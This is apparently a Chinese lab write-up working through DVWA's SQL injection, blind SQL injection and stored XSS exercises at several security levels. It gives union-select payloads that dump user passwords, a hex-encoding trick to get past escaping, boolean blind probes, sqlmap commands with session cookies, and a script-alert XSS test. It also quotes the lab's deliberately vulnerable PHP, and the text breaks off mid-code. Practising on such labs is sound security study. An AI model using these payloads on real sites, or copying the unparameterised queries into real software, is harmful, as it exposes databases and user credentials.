<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212172257273.png" alt="image-20201212172257273"></p>
<p>输入 1’ and ‘1’ = ‘1 ,查询成功。说明and被执行，是一个字符型的sql注入。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212172426799.png" alt="image-20201212172426799"></p>
<ul>
<li>获得sql语句的字段数</li>
</ul>
<p>这里利用union查询需要与主查询的列数相同的特性来猜测字段数。</p>
<p>依次用<code> 1&#39; union select 1,2,3 #</code>来猜测。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212181133795.png" alt="image-20201212181133795"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212181139975.png" alt="image-20201212181139975"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212181207701.png" alt="image-20201212181207701"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212181217925.png" alt="image-20201212181217925"></p>
<ul>
<li>获取当前数据库</li>
</ul>
<p>输入<code>1&#39; union select 1,database() #</code>，查询成功，返回数据库名。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212172736937.png" alt="image-20201212172736937"></p>
<p>但是，并不知道返回的字段顺序，也就是说目前无法确定，数据库名是1，还是dvwa。</p>
<ul>
<li>确定显示字段的顺序</li>
</ul>
<p>输入<code>1&#39; union select 1,2 #</code>，查询成功，说明了sql语句为<code>select First name,Surname from 表 where ID=’id’...</code>。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212173104813.png" alt="image-20201212173104813"></p>
<p>因此可以确定，数据库名为dvwa。</p>
<ul>
<li>获取数据库中的表</li>
</ul>
<p>输入<code>1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</code></p>
<p>查询成功，得到两个表，guestbook与users。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212173405778.png" alt="image-20201212173405778"></p>
<ul>
<li>获取表的字段名</li>
</ul>
<p>输入<code>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema=database() #</code>，查询成功，得到八个字段名，user_id,first_name,last_name,user,password,avatar,last_login,failed_login。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212184032204.png" alt="image-20201212184032204"></p>
<ul>
<li>获取表的内容</li>
</ul>
<p>输入<code>1&#39; or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #</code>。`1’ or 1=1永真，结合后面的union语句，就可以得到所有用户的user_id,first_name,last_name,password这些敏感数据。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212173822932.png" alt="image-20201212173822932"></p>
<ul>
<li>总结</li>
</ul>
<p>从判断出为字符型漏洞开始，整个问题就变得简单。而且由于是low级别，没有设置任何的过滤等。只需要union其他查询语句就基本能获得想要的数据。</p>
<ol start="2">
<li><strong>安全级别medium</strong></li>
</ol>
<p>发现前端限制了输入，通过抓包来进行sql注入。</p>
<ul>
<li>确定注入类型</li>
</ul>
<p>和之前的步骤一致，先确定注入类型。</p>
<p>输入<code>1&#39; or 1=1 #</code>，结果报错。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213143813684.png" alt="image-20201213143813684"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213143540240.png" alt="image-20201213143540240"></p>
<p>输入<code>1 or 1=1 #</code>，查询成功，且返回了所有值。说明存在数字型注入。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213143836573.png" alt="image-20201213143836573"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213143851457.png" alt="image-20201213143851457"></p>
<p><strong>确定注入类型之后，操作和low级别基本一致。区别在于将<code>1&#39;</code>    改为<code>1</code>.</strong></p>
<ul>
<li>确定查询语句字段数</li>
</ul>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213144403881.png" alt="image-20201213144403881"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213144414545.png" alt="image-20201213144414545"></p>
<ul>
<li>获取当前数据库</li>
</ul>
<p>输入<code>1 union select 1,database() #</code></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213144556703.png" alt="image-20201213144556703"></p>
<ul>
<li>获取数据库中的表</li>
</ul>
<p>输入<code>1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</code></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213144737739.png" alt="image-20201213144737739"></p>
<ul>
<li>获取表的字段名</li>
</ul>
<p>输入<code>1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema=database()# </code>查询失败。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213145021493.png" alt="image-20201213145021493"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213145047860.png" alt="image-20201213145047860"></p>
<p>根据报错信息，可以知道是将单引号转成了\’。那么就考虑绕过方法。可以使用十六进制进行绕过。将输入改为<code>1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 #</code>查询成功。<img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213145456351.png" alt="image-20201213145456351"></p>
<ul>
<li><p>获取表的内容</p>
<p>输<code>1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #</code></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213145605265.png" alt="image-20201213145605265"></p>
</li>
</ul>
<p>最后查看一下源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_POST[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    $id = mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>], $id);</span><br><span class="line"></span><br><span class="line">    $query  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="subst">$id</span>;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>], $query) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">        <span class="comment">// Display values</span></span><br><span class="line">        $first = $row[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        $last  = $row[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This is used later on in the index.php page</span></span><br><span class="line"><span class="comment">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span></span><br><span class="line">$query  = <span class="string">&quot;SELECT COUNT(*) FROM users;&quot;</span>;</span><br><span class="line">$result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line">$number_of_rows = mysqli_fetch_row( $result )[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>可以发现利用mysql_real_escape_string函数对特殊符号</p>
<p>\x00,\n,\r,,‘,”,\x1a进行转义。</p>
<ol start="3">
<li><strong>安全级别high</strong></li>
</ol>
<p>查看源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_SESSION [ <span class="string">&#x27;id&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_SESSION[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $query  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27; LIMIT 1;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>], $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        $first = $row[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        $last  = $row[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);        </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>可以发现和medium级别的差别只在，添加了LIMIT 1，限制了显示。但是可以用#注释掉，最终整个流程和low级别是一样的。</p>
<p>因此最终结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213161813828.png" alt="image-20201213161813828"></p>
<h3 id="SQL-Injection（Blind）"><a href="#SQL-Injection（Blind）" class="headerlink" title="SQL Injection（Blind）"></a>SQL Injection（Blind）</h3><ol>
<li><strong>安全级别low</strong></li>
</ol>
<p>可以看到服务器端的代码和sql注入比较，变化为不再返回查询到的内容。只返回查询的结果是否存在。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_GET[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $getid  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $getid ); <span class="comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = @mysqli_num_rows( $result ); <span class="comment">// The &#x27;@&#x27; character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span></span><br><span class="line">        header( $_SERVER[ <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="string">&#x27; 404 Not Found&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>但在实际操作中，是看不到源码的。因此首先应该确定是否存在漏洞。</p>
<ul>
<li>判断是否存在注入，注入的类型</li>
</ul>
<p>输入‘1’和<code>&#39;</code>。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213105640454.png" alt="image-20201213105640454"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213105652107.png" alt="image-20201213105652107"></p>
<p>可以知道，返回内容是根据构造的 真假条件来的，存在sql盲注。</p>
<p>接下来是确定注入类型，进行一系列的测试。</p>
<table>
<thead>
<tr>
<th>语句</th>
<th>结果</th>
</tr>
</thead>
<tbody><tr>
<td>1 and 1=1 #</td>
<td>exists</td>
</tr>
<tr>
<td>1 and 1=2 #</td>
<td>exists</td>
</tr>
<tr>
<td>1’ and 1=1 #</td>
<td>exists</td>
</tr>
<tr>
<td>1’ and 1=2 #</td>
<td>MISSING</td>
</tr>
</tbody></table>
<p>倒数两个不一样，说明是字符型注入。</p>
<p>接下来是获得当前数据库名称。</p>
<p>那么首先需要知道数据库名称长度。</p>
<p>利用二分法，输入类似<code>1&#39; and length(database())&gt;10 #</code>的语句，根据返回值可以确定数据库名称长度。</p>
<p>最终得到数据库名称长度为4.</p>
<p>然后是猜测数据库的字符组成：</p>
<p>利用substr()函数从给定的字符串中，从指定位置开始截取指定长度的字符串，分离出数据库名称的每个位置的元素，并分别将其转换为ASCII码，与对应的ASCII码值比较大小，找到比值相同时的字符，然后各个击破。</p>
<p>输入形如<code>1&#39; and ascii(substr(database(),1,1))&gt;88 #</code>的语句，同样利用二分法可以得到结果。</p>
<p>之后的表名、列名、表的内容都是类似的思路。显然这需要写一个脚本来做。同样也可以借助写好的工具，sqlmap。</p>
<ul>
<li>利用sqlmap获得数据库名、表名、列名、表的内容。</li>
</ul>
<p>输入命令<code>sqlmap -u&quot;http://b48b7cef-12e4-4de4-83fd-4bd2fecbc8f0.node3.buuoj.cn/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=kl9numacbefbi9hlmnjb6e27u4; security=low&quot; --dbs</code>可以得到数据库名，dvwa。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213112004627.png" alt="image-20201213112004627"></p>
<p>输入命令 <code>sqlmap -u&quot;http://b48b7cef-12e4-4de4-83fd-4bd2fecbc8f0.node3.buuoj.cn/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=kl9numacbefbi9hlmnjb6e27u4; security=low&quot; -D dvwa --tables</code>可以获得表名</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213112159694.png" alt="image-20201213112159694"></p>
<p>输入命令<code>sqlmap -u&quot;http://b48b7cef-12e4-4de4-83fd-4bd2fecbc8f0.node3.buuoj.cn/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=kl9numacbefbi9hlmnjb6e27u4; security=low&quot; -D dvwa -T users --columns</code>可以得到user表的列名。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213113802553.png" alt="image-20201213113802553"></p>
<p>输入命令<code>sqlmap -u&quot;http://b48b7cef-12e4-4de4-83fd-4bd2fecbc8f0.node3.buuoj.cn/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=kl9numacbefbi9hlmnjb6e27u4; security=low&quot; -D dvwa -T users -C user,password --dump</code>可以获得user表中的user和password数据。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213114136146.png" alt="image-20201213114136146"></p>
<ol start="2">
<li><strong>安全级别medium</strong></li>
</ol>
<p>和sql注入一样，使用了下拉的方式限制输入。仍然可以使用抓包的方式手动更改。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213150344031.png" alt="image-20201213150344031"></p>
<p>和low的类似，仍可以使用sqlmap进行注入。只需要使用到data参数。</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">–-data</span><br><span class="line">data后面的数据是以POST方式提交，sqlmap会像检测GET参数一样检测POST提交过去的参数</span><br></pre></td></tr></table></figure>

<p>为了节约时间，把参数设置更为详细<code>--dbms=mysql</code> 指定目标数据库类型；<code>--technique=B</code> 指定所使用的技术，这里设为布尔盲注；</p>
<p>输入命令<code>sqlmap -u&quot;http://59b24e47-2681-4b1b-bd53-71d3cdb26f72.node3.buuoj.cn/vulnerabilities/sqli_blind/#&quot; --cookie=&quot;PHPSESSID=9a1gmnli2mf556hdc3jhhq23s3; security=medium&quot; --data=&quot;id=1&amp;Submit=Submit&quot;  --dbms=MySQL --technique=B --dbs</code>获得数据库名称。</p>
<p><strong><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213153314559.png" alt="image-20201213153314559"></strong></p>
<p>输入命令<code>sqlmap -u&quot;http://59b24e47-2681-4b1b-bd53-71d3cdb26f72.node3.buuoj.cn/vulnerabilities/sqli_blind/#&quot; --cookie=&quot;PHPSESSID=9a1gmnli2mf556hdc3jhhq23s3; security=medium&quot; --data=&quot;id=1&amp;Submit=Submit&quot;  --dbms=MySQL --technique=B -D dvwa --tables</code>获得表名。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213153433823.png" alt="image-20201213153433823"></p>
<p>输入命令<code>sqlmap -u&quot;http://59b24e47-2681-4b1b-bd53-71d3cdb26f72.node3.buuoj.cn/vulnerabilities/sqli_blind/#&quot; --cookie=&quot;PHPSESSID=9a1gmnli2mf556hdc3jhhq23s3; security=medium&quot; --data=&quot;id=1&amp;Submit=Submit&quot;  --dbms=MySQL --technique=B -D dvwa -T users --columns</code></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213153632539.png" alt="image-20201213153632539"></p>
<p>输入命令，<code>sqlmap -u&quot;http://59b24e47-2681-4b1b-bd53-71d3cdb26f72.node3.buuoj.cn/vulnerabilities/sqli_blind/#&quot; --cookie=&quot;PHPSESSID=9a1gmnli2mf556hdc3jhhq23s3; security=medium&quot; --data=&quot;id=1&amp;Submit=Submit&quot;  --dbms=MySQL --technique=B -D dvwa -T users -C user,password --dump</code>获得表中的数据</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213154037652.png" alt="image-20201213154037652"></p>
<ol start="3">
<li><strong>安全级别high</strong></li>
</ol>
<p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_COOKIE[ <span class="string">&#x27;id&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_COOKIE[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $getid  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27; LIMIT 1;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $getid ); <span class="comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = @mysqli_num_rows( $result ); <span class="comment">// The &#x27;@&#x27; character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Might sleep a random amount</span></span><br><span class="line">        <span class="keyword">if</span>( rand( <span class="number">0</span>, <span class="number">5</span> ) == <span class="number">3</span> ) &#123;</span><br><span class="line">            sleep( rand( <span class="number">2</span>, <span class="number">4</span> ) );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span></span><br><span class="line">        header( $_SERVER[ <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="string">&#x27; 404 Not Found&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>发现是从cookie中读取id的值的。同时查询页面和结果页面不是同一个，可以有效防止sqlmap。但是，这里并不需要在查询页面输入，确定注入点在cookie一样可以用sqlmap。</p>
<p>输入命令<code>sqlmap -u&quot;http://59b24e47-2681-4b1b-bd53-71d3cdb26f72.node3.buuoj.cn/vulnerabilities/sqli_blind/&quot; --cookie=&quot;id=1*;PHPSESSID=9a1gmnli2mf556hdc3jhhq23s3; security=high&quot; --dbms=MySQL --technique=B --dbs</code></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213162740452.png" alt="image-20201213162740452"></p>
<p>其他过程与medium一致。</p>
<h3 id="XSS（Stored）"><a href="#XSS（Stored）" class="headerlink" title="XSS（Stored）"></a>XSS（Stored）</h3><ol>
<li><strong>安全级别low</strong></li>
</ol>
<p>服务器段的核心代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = stripslashes( $message );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $message ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $name ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span>	</span><br></pre></td></tr></table></figure>

<p>相关的函数说明：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">trim(string,charlist)</span><br><span class="line"></span><br><span class="line">函数移除字符串两侧的空白字符或其他预定义字符，预定义字符包括、\t、\n、\x0B、\r以及空格，可选参数charlist支持添加额外需要删除的字符。</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql_real_escape_string(string,connection)</span><br><span class="line"></span><br><span class="line">函数会对字符串中的特殊符号（\x00，\n，\r，\，&#39;，&quot;，\x1a）进行转义。</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">stripslashes(string)</span><br><span class="line"></span><br><span class="line">函数删除字符串中的反斜杠</span><br></pre></td></tr></table></figure>

<p>可以发现，并没有对输入做xss方面的过滤，而且会将输入存储在数据库中，因此显然存在存储型XSS漏洞。</p>
<p>接下来进行利用：</p>
<p>在message栏中输入<code>&lt;script&gt;alert(/message/)&lt;/script&gt;</code>，成功弹出弹窗。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213104232210.png" alt="image-20201213104232210"></p>
<p>在name栏发现，前端进行了字数限制，所以通过burp抓包修改。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213104440053.png" alt="image-20201213104440053"></p>
<p>成功得到弹窗。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213104500740.png" alt="image-20201213104500740"></p>
<ol start="2">
<li><strong>安全级别medium</strong></li>
</ol>
<p>服务器端代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = strip_tags( addslashes( $message ) );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $message ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = str_replace( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $name );</span><br><span class="line">    $name = ((<span 